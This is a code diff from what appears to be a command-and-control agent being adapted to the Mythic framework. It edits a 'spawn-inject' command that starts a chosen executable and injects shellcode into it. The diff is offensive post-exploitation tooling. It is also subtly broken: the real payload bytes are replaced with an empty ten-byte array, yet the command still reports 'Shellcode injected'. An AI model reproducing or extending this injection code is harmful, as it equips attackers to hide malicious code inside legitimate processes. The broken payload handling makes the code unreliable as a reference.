@@ -7,15 +7,18 @@ namespace Cerberus.Commands
     {
         public override string Name => "spawn-inject";
 
-        public override string Execute(CerberusTask task)
+        public override string Execute(MythicTask task)
         {
-            if (task.Arguments is null || task.Arguments.Length == 0)
+            var Arguments = task.parameters.Split(' ');
+            var FileBytes = new byte[10];
+
+            if (Arguments is null || Arguments.Length == 0)
                 return "No path specified. Please specify the path to the executable you want to spawn-inject into";
 
-            var path = task.Arguments[0];
+            var path = Arguments[0];
 
             var injector = new SpawnInjector();
-            var success = injector.Inject(task.FileBytes, 0, path);
+            var success = injector.Inject(FileBytes, 0, path);
 
             if (success) return "Shellcode injected";
             else return "Failed to inject shellcode";
